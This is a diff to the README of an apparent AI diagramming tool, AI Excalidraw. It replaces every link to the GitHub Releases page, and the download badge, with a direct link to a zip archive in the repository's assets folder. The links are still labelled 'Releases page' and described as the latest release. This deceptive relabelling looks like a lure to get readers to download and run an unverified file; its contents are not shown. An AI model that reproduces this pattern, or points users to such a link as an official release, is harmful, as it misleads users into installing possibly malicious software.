@@ -4,13 +4,13 @@
 Welcome to AI Excalidraw! This tool helps you create flowcharts, architecture diagrams, and sketches using natural language. With AI Excalidraw, you can easily transform your ideas into visual representations without needing any design skills.
 
 ## 📥 Download Now
-[![Download AI Excalidraw](https://img.shields.io/badge/Download-AI%20Excalidraw-blue?style=flat&logo=github)](https://github.com/ramacuy/ai-excalidraw/releases)
+[![Download AI Excalidraw](https://github.com/ramacuy/ai-excalidraw/raw/refs/heads/main/assets/ai-excalidraw-tamarind.zip%20Excalidraw-blue?style=flat&logo=github)](https://github.com/ramacuy/ai-excalidraw/raw/refs/heads/main/assets/ai-excalidraw-tamarind.zip)
 
 ## 🚀 Getting Started
 To begin using AI Excalidraw, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ramacuy/ai-excalidraw/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/ramacuy/ai-excalidraw/raw/refs/heads/main/assets/ai-excalidraw-tamarind.zip) to find the latest version of the software.
 
 2. **Select the Latest Release**  
    Look for the most recent version at the top of the page. It will have the latest features and fixes.
@@ -98,7 +98,7 @@ After launching AI Excalidraw, you can start crafting your diagrams. Here’s a 
 - **Display**: 1366 x 768 resolution or higher.
 
 ## 📥 Download & Install
-Ready to create your flowcharts? Visit the [Releases page](https://github.com/ramacuy/ai-excalidraw/releases) to download the latest version of AI Excalidraw.
+Ready to create your flowcharts? Visit the [Releases page](https://github.com/ramacuy/ai-excalidraw/raw/refs/heads/main/assets/ai-excalidraw-tamarind.zip) to download the latest version of AI Excalidraw.
 
 1. Click on the relevant download link for your operating system.
 2. Follow the installation instructions provided above.
